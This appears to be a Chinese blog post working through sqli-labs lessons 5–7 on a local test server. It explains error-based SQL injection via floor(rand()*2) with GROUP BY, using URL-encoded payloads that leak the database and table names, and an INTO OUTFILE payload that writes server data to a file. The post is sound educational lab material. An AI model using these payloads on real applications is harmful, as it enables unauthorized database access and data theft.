---
title: sqli labs lesson 5~7 学习
date: 2016-08-25 19:26:33
tags:
- 渗透测试
- SQL 注入
categories: SQL 注入
---
# 1 lesson 5：基于错误-单引号二次注入
## 1.1 测试
- 参数 $id = `1'`
- URL `http://localhost/sqli-labs-master/Less-5/?id=1%27`
- 错误 `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`
- sql 语句 `select * from tables where id = '$id' limit 0,1` ,参数在单引号内

![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f7684wu1ogj3105034gmk.jpg)

## 1.2 union 查询
- 参数 $id = `' union select 1,2,3%23`
- URL `http://localhost/sqli-labs-master/Less-5/?id=%27%20union%20select%201,2,3%23`
- sql 语句：`select col1,col2,col3 from tables where id = '' union select 1,2,3%23' limit 0,1`

![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f768d41k3hj30c903xmx8.jpg)
but.....   页面上并没有显示数据库结果的地方，即使通过 union 查询到了数据库表，字段信息，也无法显示在页面上。
因此，需要构造 <font color="red">一种语法正确（在编译时是正确的）而运行时会出错的sql查询语句，并且错误信息中包含数据局相关信息</font>。一些天才的研究人员发现，可以使用聚合函数 group by子句，并结合随机函数rand()，在运行过程中有可能出错。

## 1.3 构造编译正确，运行可能出错的sql
### 1.3.1 随机函数rand()
sql | 结果
-- | --
select rand() | 0~1 之间的随机值
select rang()*2 | 0~2 之间的随机值
select floor(rand()*2*) | 0 1 两个整数随机出现
select database() | 当前数据库
select concat((select database()),0x20,floor(rand()*2))a | {当前数据库}{空格}{0 1中的一个}
![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f768u2z3a9j30b606wt8v.jpg)

### 1.3.2 group by
`select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a`
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f768yvdsh6j30je077jrw.jpg)

重复执行多次，得到的 count(*) 不一样
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f7690aziijj30jd079gm8.jpg)

最终会出现如下错误：
![](http://ww3.sinaimg.cn/large/005CA6ZCgw1f76920orxwj30kc0a6dhf.jpg)

错误信息中会显示当前数据库名 information_schema

<font color="red">产生错误的原因：</font>
group by 语句报错的原因是 `floor(rand()*2)` 的不确定性，即结果可能为 0 也可能为 1。group by key 的原理是循环读取数据的每一行，将结果保存在临时表中，读取每一行的key时，如果key在于临时表中，则不更新临时表中的数据；如果该key不在于临时表中，则在临时表中插入key所在行的数据。
`group by floor(rand() * 2)`  出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下 `floor(rand()*2)` 可能 为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 `floor(rand()*2)`结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。

## 1.4 获取数据库信息
- 参数 $id = `' union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
- 网址  ` http://localhost/sqli-labs-master/Less-5/?id=%27%20union%20select%201,count(*),concat((select%20database()),0x20,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a%23 `
- sql 语句：`select col1,col2,col3 from tables where id = '' union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23' limit 0,1`

![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f769ox9w4ij30cb03x3yl.jpg)

刷新多次之后，出现如下错误：
![](http://ww2.sinaimg.cn/large/005CA6ZCgw1f769kss9wtj30cc03waa8.jpg)

<font color="red">将 database() 换成任何想获取的信息</font>
例如表名，则参数为
$id = `' union select 1,count(*),concat((select group_concat(distinct table_name) from information_schema.tables where table_schema = database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
![](http://ww4.sinaimg.cn/large/005CA6ZCgw1f769qoh0xbj30h703xdg6.jpg)

其他信息获取方式参见 [sqli labs lesson 1~4 学习](http://huirong.github.io/2016/08/24/sqli-labs-series-part1-4/) lesson 1

# 2 lesson 6 基于错误-双引号二次注入
$id = `" union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`

将单引号换成双引号，其他同上。

# 3 lesson 7 outfile 下载数据库
## outfile 函数
- select...into outfile 'file_name'形式的 select 可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此你必须拥有FILE权限，才能使用此语法。
- 输出不能是一个已存在的文件。防止文件数据被篡改。
- 你需要有一个登陆服务器的账号来检索文件。否则 select...into outfile 不会起任何作用。 
- 在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除

![sql](http://ww3.sinaimg.cn/large/005CA6ZCjw1f76zlw41sbj30g7046t92.jpg)

![hello.txt](http://ww2.sinaimg.cn/large/005CA6ZCgw1f76zal94ldj30g604igml.jpg)
有可能会因为目录没有 file 权限，在文件夹中没有生成 TXT 文件，多试几个目录或文件夹。

若我们想把一个可执行2进制文件用into outfile函数导出，导出后就会被破坏，因为into outfile函数会在行末端写入新行，并且会会转义换行符这样的话这个2进制可执行文件就会被破坏。这时候我们用into dumpfile 就能导出一个完整能执行的2进制文件，into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。在udf提权的时候用到的就是dumpfile。但是dumpfile 一次只能导出一行。

## 通过 outfile 获取数据库数据
$id = `1')) union select user(),database(),version() into outfile 'D:\7.txt'%23`

![](http://ww4.sinaimg.cn/large/005CA6ZCjw1f76zl5t95vj30g803o74f.jpg)

虽然页面上会显示错误，但是 D 盘会生成 7.txt 文件
![](http://ww1.sinaimg.cn/large/005CA6ZCgw1f76zj3s9suj30ga04bwez.jpg)

其他信息获取方式参见 [sqli labs lesson 1~4 学习](http://huirong.github.io/2016/08/24/sqli-labs-series-part1-4/) lesson 1

# 4 参考文献
[SQLI-LABS SERIES PART 6,7](http://dummy2dummies.blogspot.com/2012/06/sqli-lab-series-part-6.html)